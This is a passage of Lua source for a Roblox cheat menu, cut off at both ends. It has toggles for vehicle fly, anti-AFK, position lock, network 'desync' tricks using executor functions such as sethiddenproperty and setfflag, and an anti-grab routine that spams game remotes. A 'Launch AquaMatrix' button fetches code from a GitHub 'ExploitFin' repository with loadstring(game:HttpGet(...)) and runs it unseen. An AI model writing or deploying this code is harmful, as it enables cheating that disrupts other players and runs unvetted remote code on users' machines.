								end
							end)
						else
							local character = lp.Character

							if character then
								for _, child in pairs(character:GetChildren()) do
									if child:IsA("BasePart") then
										child.CanCollide = true
									end
								end
							end
						end
					end,
				})

				v16:CreateToggle({
					Name = "Water Walk",
					Default = false,
					Callback = function(canCollide)
						flag9 = canCollide

						for _, v17 in pairs(tbl5) do
							if v17.part then
								v17.part.CanCollide = canCollide
							end
						end
					end,
				})
			end

			v16:CreateSection("Vehicle Fly")

			v16:CreateKeybind({
				Name = "Toggle Vehicle Fly",
				Default = Enum.KeyCode.X,
				HoldToInteract = false,
				Callback = function()
					if flag7 then
						fn13()
					else
						fn12()
					end
				end,
			})

			v16:CreateSlider({
				Name = "Fly Speed",
				Min = 1,
				Max = 20,
				Default = 5,
				Callback = function(arg)
					n25 = arg
				end,
			})

			local lp2, rs2, UserInputService, v17
			local playerTab = _G.PlayerTab
			lp2 = _G.LP
			rs2 = _G.RS
			UserInputService = game:GetService("UserInputService")
			game:GetService("Players")
			v17 = playerTab:CreateBlock({ Name = "Other", Side = "Left", ImageID = "116797159425110" })

			do
				local flag8 = false
				local connection = nil

				v17:CreateToggle({
					Name = "Anti AFK",
					Default = false,
					Flag = "Other_AntiAFK",
					Callback = function(arg)
						flag8 = arg

						if arg then
							local VirtualUser = game:GetService("VirtualUser")

							connection = lp2.Idled:Connect(function()
								pcall(function()
									VirtualUser:Button2Down(Vector2.new(0, 0))
									task.wait(0.5)
									VirtualUser:Button2Up(Vector2.new(0, 0))
								end)
							end)
						elseif connection then
							connection:Disconnect()
							connection = nil
						end
					end,
				})
			end

			v17:CreateKeybind({
				Name = "Respawn (Kill) Key",
				Default = Enum.KeyCode.Q,
				HoldToInteract = false,
				Callback = function()
					local character = lp2.Character
					if not character then
						return
					end
					local humanoid = character:FindFirstChildOfClass("Humanoid")

					if humanoid and humanoid.Health > 0 then
						pcall(function()
							humanoid.Health = 0
						end)
					else
						pcall(function()
							lp2:LoadCharacter()
						end)
					end
				end,
			})

			do
				local flag8 = false
				local thread = nil
				local cFrame = nil

				local function fn14()
					flag8 = false

					if thread then
						task.cancel(thread)
						thread = nil
					end

					cFrame = nil
				end

				local function fn15()
					local character = lp2.Character
					if not character then
						return
					end
					local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
					if not humanoidRootPart then
						return
					end
					cFrame = humanoidRootPart.CFrame
					flag8 = true

					thread = task.spawn(function()
						while flag8 do
							local character2 = lp2.Character

							if character2 then
								local humanoidRootPart2 = character2:FindFirstChild("HumanoidRootPart")
								local humanoid = character2:FindFirstChild("Humanoid")

								if humanoidRootPart2 and humanoid and humanoid.Health > 0 and cFrame then
									humanoidRootPart2.CFrame = cFrame
									humanoidRootPart2.Velocity = Vector3.zero
									humanoidRootPart2.RotVelocity = Vector3.zero
									humanoidRootPart2.AssemblyLinearVelocity = Vector3.zero
									humanoidRootPart2.AssemblyAngularVelocity = Vector3.zero

									for _, v18 in pairs({
										"Head",
										"Torso",
										"Left Arm",
										"Right Arm",
										"Left Leg",
										"Right Leg",
										"UpperTorso",
										"LowerTorso",
									}) do
										local v19 = character2:FindFirstChild(v18)

										if v19 then
											v19.Velocity = Vector3.zero
											v19.RotVelocity = Vector3.zero
											v19.AssemblyLinearVelocity = Vector3.zero
											v19.AssemblyAngularVelocity = Vector3.zero
										end
									end
								end
							end

							task.wait()
						end
					end)
				end

				v17:CreateToggle({
					Name = "Lock Position (keeps you at current spot)",
					Default = false,
					Flag = "Other_LockPos",
					Callback = function(arg)
						if arg then
							fn15()
						else
							fn14()
						end
					end,
				})

				lp2.CharacterAdded:Connect(function(character)
					if flag8 then
						task.wait()
						local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")

						if humanoidRootPart and cFrame then
							humanoidRootPart.CFrame = cFrame
						end
					end
				end)
			end

			v17:CreateButton({
				Name = "Launch AquaMatrix",
				Callback = function()
					pcall(function()
						loadstring(game:HttpGet("https://raw.githubusercontent.com/ExploitFin/AquaMatrix/refs/heads/AquaMatrix/AquaMatrix"))()
					end)
				end,
			})

			v17:CreateSection("Support only for RakNet")
			local character
			character = lp2.Character or lp2.CharacterAdded:Wait()
			local humanoidRootPart
			humanoidRootPart = character:WaitForChild("HumanoidRootPart")

			lp2.CharacterAdded:Connect(function(character2)
				character = character2
				humanoidRootPart = character:WaitForChild("HumanoidRootPart")
			end)

			local tbl5, screenGui

			do
				local function fn14()
					local ok, result = pcall(function()
						if gethui then
							return gethui()
						end
						return game:GetService("CoreGui")
					end)

					if ok and result then
						return result
					end
					return lp2:WaitForChild("PlayerGui")
				end

				local v18 = fn14()

				if v18:FindFirstChild("DesyncMenu") then
					v18.DesyncMenu:Destroy()
				end

				tbl5 = {
					bg = Color3.fromRGB(25, 25, 25),
					stroke = Color3.fromRGB(60, 60, 60),
					accent = Color3.fromRGB(209, 164, 222),
					text = Color3.fromRGB(235, 235, 235),
					sub = Color3.fromRGB(200, 200, 200),
					buttonOff = Color3.fromRGB(45, 45, 45),
					buttonOn = Color3.fromRGB(90, 60, 110),
				}

				screenGui = Instance.new("ScreenGui")
				screenGui.Name = "DesyncMenu"
				screenGui.ResetOnSpawn = false
				screenGui.IgnoreGuiInset = true
				screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
				screenGui.Enabled = false
				screenGui.Parent = v18
			end

			local frame2
			frame2 = Instance.new("Frame")
			frame2.Name = "MainFrame"
			frame2.BackgroundColor3 = tbl5.bg
			frame2.BorderSizePixel = 0
			frame2.Position = UDim2.new(0, 20, 1, -200)
			frame2.Size = UDim2.new(0, 240, 0, 185)
			frame2.ZIndex = 100
			frame2.Parent = screenGui
			local uiCorner = Instance.new("UICorner")
			uiCorner.CornerRadius = UDim.new(0, 6)
			uiCorner.Parent = frame2
			local uiStroke = Instance.new("UIStroke")
			uiStroke.Thickness = 1
			uiStroke.Color = tbl5.stroke
			uiStroke.Parent = frame2

			do
				local frame3 = Instance.new("Frame")
				frame3.Size = UDim2.new(1, 0, 0, 3)
				frame3.Position = UDim2.new(0, 0, 0, -1)
				frame3.BackgroundColor3 = tbl5.accent
				frame3.BorderSizePixel = 0
				frame3.ZIndex = 101
				frame3.Parent = frame2
				local uiCorner2 = Instance.new("UICorner")
				uiCorner2.CornerRadius = UDim.new(0, 6)
				uiCorner2.Parent = frame3
			end

			local n26

			do
				local textLabel = Instance.new("TextLabel")
				textLabel.BackgroundTransparency = 1
				textLabel.Position = UDim2.new(0, 10, 0, 5)
				textLabel.Size = UDim2.new(1, -20, 0, 20)
				textLabel.Font = Enum.Font.Code
				textLabel.TextSize = 14
				textLabel.TextColor3 = tbl5.text
				textLabel.TextXAlignment = Enum.TextXAlignment.Left
				textLabel.Text = "Multi-Desync Menu [Insert]"
				textLabel.ZIndex = 102
				textLabel.Parent = frame2
				local frame3 = Instance.new("Frame")
				frame3.BackgroundTransparency = 1
				frame3.Position = UDim2.new(0, 10, 0, 30)
				frame3.Size = UDim2.new(1, -20, 1, -35)
				frame3.ZIndex = 101
				frame3.Parent = frame2
				local uiListLayout = Instance.new("UIListLayout")
				uiListLayout.FillDirection = Enum.FillDirection.Vertical
				uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
				uiListLayout.Padding = UDim.new(0, 6)
				uiListLayout.Parent = frame3
				local flag8 = nil
				local v18 = nil
				local position = nil
				local position2 = nil

				textLabel.InputBegan:Connect(function(input)
					if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
						flag8 = true
						position = input.Position
						position2 = frame2.Position

						input.Changed:Connect(function()
							if input.UserInputState == Enum.UserInputState.End then
								flag8 = false
							end
						end)
					end
				end)

				textLabel.InputChanged:Connect(function(input)
					if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
						v18 = input
					end
				end)

				UserInputService.InputChanged:Connect(function(input)
					if input == v18 and flag8 then
						local n27 = input.Position - position
						frame2.Position = UDim2.new(position2.X.Scale, position2.X.Offset + n27.X, position2.Y.Scale, position2.Y.Offset + n27.Y)
					end
				end)

				local function fn14(text, layoutOrder, arg)
					local frame4 = Instance.new("Frame")
					frame4.BackgroundTransparency = 1
					frame4.Size = UDim2.new(1, 0, 0, 30)
					frame4.LayoutOrder = layoutOrder
					frame4.ZIndex = 102
					frame4.Parent = frame3
					local textLabel2 = Instance.new("TextLabel")
					textLabel2.BackgroundTransparency = 1
					textLabel2.Position = UDim2.new(0, 0, 0, 0)
					textLabel2.Size = UDim2.new(0.55, 0, 1, 0)
					textLabel2.Font = Enum.Font.Code
					textLabel2.TextSize = 13
					textLabel2.TextColor3 = tbl5.text
					textLabel2.TextXAlignment = Enum.TextXAlignment.Left
					textLabel2.Text = text
					textLabel2.ZIndex = 102
					textLabel2.Parent = frame4
					local textButton = Instance.new("TextButton")
					textButton.BackgroundColor3 = tbl5.buttonOff
					textButton.Position = UDim2.new(0.6, 0, 0, 2)
					textButton.Size = UDim2.new(0.4, 0, 1, -4)
					textButton.Font = Enum.Font.Code
					textButton.TextSize = 12
					textButton.TextColor3 = tbl5.sub
					textButton.Text = "OFF"
					textButton.AutoButtonColor = false
					textButton.ZIndex = 102
					textButton.Parent = frame4
					local uiCorner2 = Instance.new("UICorner")
					uiCorner2.CornerRadius = UDim.new(0, 4)
					uiCorner2.Parent = textButton
					local uiStroke2 = Instance.new("UIStroke")
					uiStroke2.Thickness = 1
					uiStroke2.Color = tbl5.stroke
					uiStroke2.Parent = textButton
					local flag9 = false

					textButton.MouseButton1Click:Connect(function()
						flag9 = not flag9

						if flag9 then
							textButton.BackgroundColor3 = tbl5.buttonOn
							textButton.TextColor3 = tbl5.text
							textButton.Text = "ON"
						else
							textButton.BackgroundColor3 = tbl5.buttonOff
							textButton.TextColor3 = tbl5.sub
							textButton.Text = "OFF"
						end

						arg(flag9)
					end)
				end

				local connection = nil

				fn14("Desync 1", 1, function(arg)
					if arg then
						local n27 = 30
						local flag9 = false

						connection = rs2.Heartbeat:Connect(function()
							if not character or not character.Parent or not humanoidRootPart then
								if connection then
									connection:Disconnect()
								end

								return
							end

							if flag9 then
								return
							end

							if n27 > 0 then
								pcall(sethiddenproperty, humanoidRootPart, "PhysicsRepRootPart", humanoidRootPart)
								n27 -= 1
							else
								flag9 = true
								pcall(sethiddenproperty, humanoidRootPart, "PhysicsRepRootPart", nil)
								task.wait(0.1)
								pcall(sethiddenproperty, humanoidRootPart, "PhysicsRepRootPart", humanoidRootPart)
								n27 = 30
								flag9 = false
							end
						end)
					else
						if connection then
							connection:Disconnect()
							connection = nil
						end

						pcall(function()
							if humanoidRootPart then
								sethiddenproperty(humanoidRootPart, "PhysicsRepRootPart", humanoidRootPart)
							end
						end)
					end
				end)

				local thread = nil
				local flag9 = false
				n26 = 100000

				fn14("Desync 2", 2, function(arg)
					flag9 = arg

					if arg then
						pcall(setfflag, "S2PhysicsSenderRate", n26)

						thread = task.spawn(function()
							local n27 = 0

							while true do
								if flag9 and lp2.Character == character and task.wait(0.0041666666666666666) then
									if not (not humanoidRootPart or not humanoidRootPart.Parent) then
										if n27 <= 0 then
											pcall(sethiddenproperty, humanoidRootPart, "PhysicsRepRootPart", nil)
											task.wait(0.1)
											pcall(sethiddenproperty, humanoidRootPart, "PhysicsRepRootPart", humanoidRootPart)
											n27 = 20
										else
											n27 -= 1
											pcall(sethiddenproperty, humanoidRootPart, "PhysicsRepRootPart", humanoidRootPart)
										end

										continue
									end
								end

								break
							end
						end)
					else
						flag9 = false

						pcall(function()
							if humanoidRootPart then
								sethiddenproperty(humanoidRootPart, "PhysicsRepRootPart", humanoidRootPart)
							end
						end)
					end
				end)

				local flag10 = false
				local v19 = Random.new()
				local tbl6 = {}

				local function fn15()
					local tbl7 = {}

					for _, descendant in pairs(workspace:GetDescendants()) do
						if descendant:IsA("BasePart") and descendant ~= character and descendant:FindFirstChildOfClass("Humanoid") == nil then
							table.insert(tbl7, descendant)
						end
					end

					return tbl7
				end

				fn14("Desync 3", 3, function(arg)
					flag10 = arg

					if arg then
						tbl6 = fn15()

						task.spawn(function()
							while flag10 do
								if not (not humanoidRootPart or not humanoidRootPart.Parent) then
									pcall(function()
										sethiddenproperty(humanoidRootPart, "PhysicsRepRootPart", humanoidRootPart)
									end)

									task.wait(0.0041666666666666666)

									if #tbl6 == 0 then
										tbl6 = fn15()
									end

									if #tbl6 > 0 then
										local v20 = tbl6[v19:NextInteger(1, #tbl6)]

										if v20 and v20.Parent then
											pcall(function()
												sethiddenproperty(humanoidRootPart, "PhysicsRepRootPart", v20)
											end)
										end
									end

									task.wait(0.0041666666666666666)
									continue
								end

								break
							end

							pcall(function()
								if humanoidRootPart then
									sethiddenproperty(humanoidRootPart, "PhysicsRepRootPart", humanoidRootPart)
								end
							end)
						end)
					else
						flag10 = false

						pcall(function()
							if humanoidRootPart then
								sethiddenproperty(humanoidRootPart, "PhysicsRepRootPart", humanoidRootPart)
							end
						end)
					end
				end)

				local frame4 = Instance.new("Frame")
				frame4.BackgroundTransparency = 1
				frame4.Size = UDim2.new(1, 0, 0, 35)
				frame4.LayoutOrder = 4
				frame4.ZIndex = 102
				frame4.Parent = frame3
				local textLabel2 = Instance.new("TextLabel")
				textLabel2.BackgroundTransparency = 1
				textLabel2.Position = UDim2.new(0, 0, 0, 0)
				textLabel2.Size = UDim2.new(1, 0, 0, 16)
				textLabel2.Font = Enum.Font.Code
				textLabel2.TextSize = 11
				textLabel2.TextColor3 = tbl5.sub
				textLabel2.TextXAlignment = Enum.TextXAlignment.Left
				textLabel2.Text = "SenderRate: 100000"
				textLabel2.ZIndex = 102
				textLabel2.Parent = frame4
				local frame5 = Instance.new("Frame")
				frame5.BackgroundColor3 = tbl5.buttonOff
				frame5.Position = UDim2.new(0, 0, 0, 20)
				frame5.Size = UDim2.new(1, 0, 0, 8)
				frame5.BorderSizePixel = 0
				frame5.ZIndex = 102
				frame5.Parent = frame4
				local uiCorner2 = Instance.new("UICorner")
				uiCorner2.CornerRadius = UDim.new(1, 0)
				uiCorner2.Parent = frame5
				local uiStroke2 = Instance.new("UIStroke")
				uiStroke2.Thickness = 1
				uiStroke2.Color = tbl5.stroke
				uiStroke2.Parent = frame5
				local frame6 = Instance.new("Frame")
				frame6.BackgroundColor3 = tbl5.buttonOn
				frame6.Size = UDim2.new(0, 0, 1, 0)
				frame6.BorderSizePixel = 0
				frame6.ZIndex = 103
				frame6.Parent = frame5
				local uiCorner3 = Instance.new("UICorner")
				uiCorner3.CornerRadius = UDim.new(1, 0)
				uiCorner3.Parent = frame6
				local n27 = 1
				local n28 = 1e9
				local flag11 = false

				local function fn16(arg)
					local n29 = math.clamp((arg.Position.X - frame5.AbsolutePosition.X) / frame5.AbsoluteSize.X, 0, 1)
					frame6.Size = UDim2.new(n29, 0, 1, 0)
					local n30 = math.floor(n27 * (n28 / n27) ^ n29)
					n26 = n30
					textLabel2.Text = "SenderRate: " .. tostring(n30)

					pcall(function()
						setfflag("S2PhysicsSenderRate", n30)
					end)
				end

				frame5.InputBegan:Connect(function(input)
					if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
						flag11 = true
						fn16(input)
					end
				end)

				UserInputService.InputEnded:Connect(function(input)
					if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
						flag11 = false
					end
				end)

				UserInputService.InputChanged:Connect(function(input)
					local flag12 = flag11

					if flag11 then
						flag12 = input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch
					end

					if flag12 then
						fn16(input)
					end
				end)

				frame6.Size = UDim2.new(math.log(100000 / n27) / math.log(n28 / n27), 0, 1, 0)
			end

			UserInputService.InputBegan:Connect(function(input, gameProcessed)
				if gameProcessed then
					return
				end

				if input.KeyCode == Enum.KeyCode.Insert then
					screenGui.Enabled = not screenGui.Enabled
				end
			end)

			v17:CreateToggle({
				Name = "Desync menu",
				Default = false,
				Flag = "Other_DesyncMenuToggle",
				Callback = function(enabled)
					screenGui.Enabled = enabled
				end,
			})

			_G.AntiFunctionsBlock = _G.ProtectionTab:CreateBlock({ Name = "Anti-Functions", Side = "Left", ImageID = "116957729492323" })

			do
				local antiFunctionsBlock = _G.AntiFunctionsBlock
				local lp3 = _G.LP
				local repS = _G.RepS
				local currentCamera = workspace.CurrentCamera
				local RunService = game:GetService("RunService")
				local UserInputService2 = game:GetService("UserInputService")
				local flag8 = false
				local flag9 = false
				local flag10 = false
				local walkSpeed = nil
				local connection = nil

				local tbl6 = {
					Head = { X = 0, Y = 1.5, Z = 0, RX = 0, RY = 0, RZ = 0 },
					["Left Arm"] = { X = -1.5, Y = 0, Z = 0, RX = 0, RY = 0, RZ = 0 },
					["Right Arm"] = { X = 1.5, Y = 0, Z = 0, RX = 0, RY = 0, RZ = 0 },
					["Left Leg"] = { X = -0.5, Y = -2, Z = 0, RX = 0, RY = 0, RZ = 0 },
					["Right Leg"] = { X = 0.5, Y = -2, Z = 0, RX = 0, RY = 0, RZ = 0 },
				}

				local flag11 = false

				local function fn14(arg, arg2, arg3)
					local v18 = arg:FindFirstChild(arg2)
					local v19

					if v18 then
						v19 = v18
					else
						v19 = arg:WaitForChild(arg2, arg3 or 3)
					end

					return v19
				end

				local function fn15(arg)
					if _G.Cons and _G.Cons[arg] then
						_G.Cons[arg]:Disconnect()
						_G.Cons[arg] = nil
					end
				end

				local function fn16(arg)
					for k in pairs(tbl6) do
						local v18 = arg:FindFirstChild(k)

						if v18 and v18:IsA("BasePart") then
							v18.CanCollide = false
							v18.Massless = false

							if v18:FindFirstChild("RagdollLimbPart") then
								v18.RagdollLimbPart.CanCollide = false
							end
						end
					end
				end

				local function fn17(arg)
					for k in pairs(tbl6) do
						local v18 = arg:FindFirstChild(k)

						if v18 and v18:IsA("BasePart") then
							v18.CanCollide = true
							v18.CanTouch = true
						end
					end
				end

				local function fn18(arg, arg2, arg3)
					for k, v18 in pairs(tbl6) do
						local v19 = arg:FindFirstChild(k)

						if v19 and v19:IsA("BasePart") then
							local tbl7 = { X = v18.X, Y = v18.Y, Z = v18.Z, RX = v18.RX, RY = v18.RY, RZ = v18.RZ }
							local flag12

							if arg3 then
								flag12 = k == "Left Leg" or k == "Right Leg"
							else
								flag12 = arg3
							end

							if flag12 then
								tbl7.Y = 8888
							end

							local cframe = CFrame.Angles
							v19.CFrame = arg2 * CFrame.new(tbl7.X, tbl7.Y, tbl7.Z) * cframe(math.rad(tbl7.RX), math.rad(tbl7.RY), math.rad(tbl7.RZ))
						end
					end
				end

				local function fn19(arg)
					if flag10 then
						return
					end

					if arg then
						local humanoid = arg:FindFirstChildOfClass("Humanoid")

						if humanoid then
							walkSpeed = humanoid.WalkSpeed
							humanoid.WalkSpeed = 60
						end
					end

					flag10 = true

					if connection then
						connection:Disconnect()
					end

					connection = RunService.Stepped:Connect(function(time_, deltaTime)
						if not flag10 then
							return
						end
						local character2 = lp3.Character
						if not character2 then
							return
						end
						local humanoidRootPart2 = character2:FindFirstChild("HumanoidRootPart")
						local humanoid = character2:FindFirstChildOfClass("Humanoid")
						if not humanoidRootPart2 or not humanoid then
							return
						end

						if not (humanoid.SeatPart and humanoid.SeatPart.Parent and humanoid.SeatPart.Parent.Name == "CreatureBlobman") then
							DisableBlobSpeed()
							return
						end
						humanoid.WalkSpeed = 60
						local moveDirection = humanoid.MoveDirection

						if moveDirection.Magnitude > 0 then
							local n27 = moveDirection.Unit * 60 * deltaTime
							humanoidRootPart2.CFrame = humanoidRootPart2.CFrame + Vector3.new(n27.X, 0, n27.Z)
						end
					end)
				end

				local function fn20()
					if not flag10 then
						return
					end
					flag10 = false

					if connection then
						connection:Disconnect()
						connection = nil
					end

					local character2 = lp3.Character

					if character2 then
						local humanoid = character2:FindFirstChildOfClass("Humanoid")

						if humanoid and walkSpeed then
							humanoid.WalkSpeed = walkSpeed
							walkSpeed = nil
						end
					end
				end

				local function fn21()
					if _G.Cons.A_observer then
						_G.Cons.A_observer:Disconnect()
						_G.Cons.A_observer = nil
					end

					if _G.Cons.A_loop then
						_G.Cons.A_loop:Disconnect()
						_G.Cons.A_loop = nil
					end

					if _G.Cons.A_blobSeat then
						_G.Cons.A_blobSeat:Disconnect()
						_G.Cons.A_blobSeat = nil
					end

					if _G.Cons.A_blobFastRagdoll then
						_G.Cons.A_blobFastRagdoll:Disconnect()
						_G.Cons.A_blobFastRagdoll = nil
					end

					if _G.Cons.A_connection then
						_G.Cons.A_connection:Disconnect()
						_G.Cons.A_connection = nil
					end

					if _G.Cons.A_Death then
						_G.Cons.A_Death:Disconnect()
						_G.Cons.A_Death = nil
					end
				end

				local function fn22(arg)
					fn21()
					if not arg then
						return
					end
					local humanoid = fn14(arg, "Humanoid", 5)
					local torso = fn14(arg, "Torso", 5) or fn14(arg, "UpperTorso", 5)
					local humanoidRootPart2 = fn14(arg, "HumanoidRootPart", 5)
					if not humanoid or not torso or not humanoidRootPart2 then
						return
					end

					if not flag8 then
						return
					end
					local ragdolled = fn14(humanoid, "Ragdolled", 10)
					if not ragdolled then
						return
					end

					_G.Cons.A_Death = humanoid.Died:Connect(function()
						fn21()
						fn20()
						flag11 = false
					end)

					local flag12 = false
					local ragdollRemote = repS:FindFirstChild("CharacterEvents") and repS.CharacterEvents:FindFirstChild("RagdollRemote")

					local function fn23()
						if flag11 then
							return
						end
						flag11 = true

						if _G.Cons.A_blobFastRagdoll then
							_G.Cons.A_blobFastRagdoll:Disconnect()
							_G.Cons.A_blobFastRagdoll = nil
						end

						fn20()

						if humanoidRootPart2 and humanoidRootPart2.Parent then
							humanoidRootPart2.CFrame = humanoidRootPart2.CFrame + Vector3.new(0, 4, 0)
						end

						task.spawn(function()
							for i = 1, 20 do
								if humanoid and humanoid.Parent then
									humanoid.Sit = false
								end

								task.wait(0.1)
							end

							flag12 = false
							flag11 = false
						end)
					end

					_G.Cons.A_blobSeat = humanoid:GetPropertyChangedSignal("SeatPart"):Connect(function()
						local v18 = flag11
						local flag13

						if flag11 then
							flag13 = v18
						else
							flag13 = not flag8
						end

						if flag13 then
							return
						end

						if not ragdolled.Value then
							return
						end

						if humanoid.SeatPart and humanoid.SeatPart.Parent and humanoid.SeatPart.Parent.Name == "CreatureBlobman" and not flag12 then
							flag12 = true
							local seatPart = humanoid.SeatPart
							fn19(arg)

							while not humanoid.Sit and flag8 and ragdolled.Value do
								task.wait()
							end

							if ragdollRemote and humanoidRootPart2.Parent then
								ragdollRemote:FireServer(humanoidRootPart2, 3)
							end

							while not ragdolled.Value and not humanoid.Sit and flag8 do
								task.wait()
							end

							task.wait(0.15)

							if humanoid.Parent and seatPart.Parent then
								humanoid.Sit = true
								seatPart:Sit(humanoid)
							end

							task.delay(0.25, function()
								if _G.Cons.A_blobFastRagdoll then
									_G.Cons.A_blobFastRagdoll:Disconnect()
								end

								if flag11 or not flag8 then
									return
								end

								_G.Cons.A_blobFastRagdoll = RunService.Heartbeat:Connect(function()
									if ragdolled.Value and humanoid and humanoid.SeatPart and humanoid.SeatPart.Parent and humanoid.SeatPart.Parent.Name == "CreatureBlobman" and ragdollRemote and humanoidRootPart2 and humanoidRootPart2.Parent then
										ragdollRemote:FireServer(humanoidRootPart2, 1)
									elseif not flag11 then
										fn23()
									end
								end)
							end)
						end
					end)

					local bombExplode = repS:FindFirstChild("BombEvents") and repS.BombEvents:FindFirstChild("BombExplode")

					if bombExplode then
						_G.Cons.A_connection = bombExplode.OnClientEvent:Connect(function(arg2, arg3)
							if not flag8 or not humanoidRootPart2 or not humanoidRootPart2.Parent or not humanoid or not humanoid.Parent then
								return
							end

							task.spawn(function()
								if arg2.Radius + 10 > (arg3 - humanoidRootPart2.Position).Magnitude then
									humanoidRootPart2.Anchored = true
									task.wait()
									humanoid:ChangeState(Enum.HumanoidStateType.Running)
									humanoidRootPart2.Anchored = false
									fn16(arg)
								end
							end)
						end)
					end

					local function fn24()
						if ragdolled.Value == true and flag8 then
							fn16(arg)

							if _G.Cons.A_loop then
								_G.Cons.A_loop:Disconnect()
							end

							_G.Cons.A_loop = RunService.RenderStepped:Connect(function()
								local flag13 = humanoid and humanoid.SeatPart and humanoid.SeatPart.Parent and humanoid.SeatPart.Parent.Name == "CreatureBlobman"

								if not arg.Parent or not humanoidRootPart2 or not humanoidRootPart2.Parent or not torso or not torso.Parent or not humanoid or not humanoid.Parent or not ragdolled.Value then
									if _G.Cons.A_loop then
										_G.Cons.A_loop:Disconnect()
										_G.Cons.A_loop = nil
									end

									return
								end

								if flag13 and not flag11 then
									if UserInputService2:IsKeyDown(Enum.KeyCode.Space) then
										fn23()
										return
									end
								end

								if not flag13 and not flag11 then
									humanoid.PlatformStand = false
									humanoid.Sit = false
								end

								local lookVector = currentCamera.CFrame.LookVector
								local v18 = math.atan2(-lookVector.X, -lookVector.Z)
								humanoidRootPart2.CFrame = CFrame.new(humanoidRootPart2.Position) * CFrame.Angles(0, v18, 0)

								if torso and torso.Parent then
									fn18(arg, torso.CFrame, flag13)
								end
							end)
						else
							if _G.Cons.A_loop then
								_G.Cons.A_loop:Disconnect()
								_G.Cons.A_loop = nil
							end

							if _G.Cons.A_blobFastRagdoll then
								_G.Cons.A_blobFastRagdoll:Disconnect()
								_G.Cons.A_blobFastRagdoll = nil
							end

							fn17(arg)

							if humanoidRootPart2 then
								humanoidRootPart2.Anchored = false
							end

							if humanoid then
								humanoid.PlatformStand = false
							end

							flag12 = false
							fn20()
						end
					end

					_G.Cons.A_observer = ragdolled:GetPropertyChangedSignal("Value"):Connect(fn24)

					if ragdolled.Value then
						fn24()
					end
				end

				local function fn23(arg)
					local humanoidRootPart2 = fn14(arg, "HumanoidRootPart", 5)
					local humanoid = fn14(arg, "Humanoid", 5)
					local torso = fn14(arg, "Torso", 5) or fn14(arg, "UpperTorso", 5)
					local isHeld = fn14(lp3, "IsHeld", 5)
					if not (humanoidRootPart2 and humanoid and torso and isHeld) then
						return
					end

					if not flag8 then
						return
					end
					fn15("AG_GrabDetect")

					if _G.Cons.AG_StruggleTask then
						task.cancel(_G.Cons.AG_StruggleTask)
						_G.Cons.AG_StruggleTask = nil
					end

					local function fn24()
						if _G.Cons.AG_StruggleTask then
							task.cancel(_G.Cons.AG_StruggleTask)
						end

						_G.Cons.AG_StruggleTask = task.spawn(function()
							while isHeld.Value and flag8 and humanoid and humanoid.Parent and humanoidRootPart2 and humanoidRootPart2.Parent do
								local characterEvents = repS:FindFirstChild("CharacterEvents")

								if characterEvents then
									if characterEvents:FindFirstChild("Struggle") then
										characterEvents.Struggle:FireServer(lp3)
									end

									if characterEvents:FindFirstChild("RagdollRemote") then
										characterEvents.RagdollRemote:FireServer(humanoidRootPart2, 0)
									end
								end

								task.wait(0.15)
							end
						end)
					end

					_G.Cons.AG_GrabDetect = isHeld:GetPropertyChangedSignal("Value"):Connect(function()
						if isHeld.Value then
							flag9 = false
							task.wait()
							flag9 = true

							if humanoidRootPart2 and humanoidRootPart2.Parent then
								humanoidRootPart2.Anchored = true
								task.wait()
								humanoidRootPart2.Anchored = false
							end

							fn24()
						else
							flag9 = false

							if _G.Cons.AG_StruggleTask then
								task.cancel(_G.Cons.AG_StruggleTask)
								_G.Cons.AG_StruggleTask = nil
							end
						end
					end)

					if isHeld.Value then
						fn24()
					end

					if _G.Cons.AG_MainLoop then
						_G.Cons.AG_MainLoop:Disconnect()
					end

					_G.Cons.AG_MainLoop = RunService.RenderStepped:Connect(function()
						if not isHeld.Value then
							return
						end

						if not (humanoidRootPart2 and humanoidRootPart2.Parent) then
							return
						end

						if not (humanoid and humanoid.Parent) then
							return
						end
						humanoid.PlatformStand = false
						humanoid.Sit = false
						local lookVector = currentCamera.CFrame.LookVector
						local v18 = math.atan2(-lookVector.X, -lookVector.Z)
						humanoidRootPart2.CFrame = CFrame.new(humanoidRootPart2.Position) * CFrame.Angles(0, v18, 0)

						if torso and torso.Parent and flag9 then
							local ragdolled = humanoid:FindFirstChild("Ragdolled")

							if ragdolled and ragdolled.Value == true then
								fn18(arg, torso.CFrame, false)
							end
						end
					end)
				end

				local function fn24(arg)
					if not arg then
						return
					end

					for _, child in pairs(arg:GetChildren()) do
						if child:IsA("BasePart") then
							for _, child2 in pairs(child:GetChildren()) do
								if child2:IsA("BallSocketConstraint") or child2:IsA("WeldConstraint") then
									child2.Enabled = true
								end
							end
						end
					end
				end

				antiFunctionsBlock:CreateToggle({
					Name = "Anti [Grab | Ragdoll | Explode]",
					Default = false,
					Callback = function(arg)
						flag8 = arg
						_G.Cons = _G.Cons or {}
						flag9 = false
						flag11 = false

						if flag8 then
							if lp3.Character then
								task.spawn(function()
									fn23(lp3.Character)
									fn22(lp3.Character)
								end)
							end

							fn15("AG_CharAdded")

							_G.Cons.AG_CharAdded = lp3.CharacterAdded:Connect(function(character2)
								task.wait()

								if flag8 then
									fn23(character2)
									fn22(character2)
								end
							end)
						else
							fn21()
							fn15("AG_GrabDetect")
							fn15("AG_MainLoop")
							fn15("AG_CharAdded")
							fn20()

							if lp3.Character then
								fn24(lp3.Character)
								fn17(lp3.Character)
								local humanoidRootPart2 = lp3.Character:FindFirstChild("HumanoidRootPart")

								if humanoidRootPart2 then
									humanoidRootPart2.Anchored = false
								end

								local humanoid = lp3.Character:FindFirstChild("Humanoid")

								if humanoid then
									humanoid.PlatformStand = false
								end
							end
						end
					end,
				})
			end

			local antiFunctionsBlock
			antiFunctionsBlock = _G.AntiFunctionsBlock
			local lp3
			lp3 = _G.LP
			local flag8

			do
				local repS = _G.RepS
				local currentCamera = workspace.CurrentCamera
				local thread = nil
				local flag9 = false
				flag8 = false
				local RunService = game:GetService("RunService")
				local UserInputService2 = game:GetService("UserInputService")
				local flag10 = false
				local walkSpeed = nil
				local connection = nil

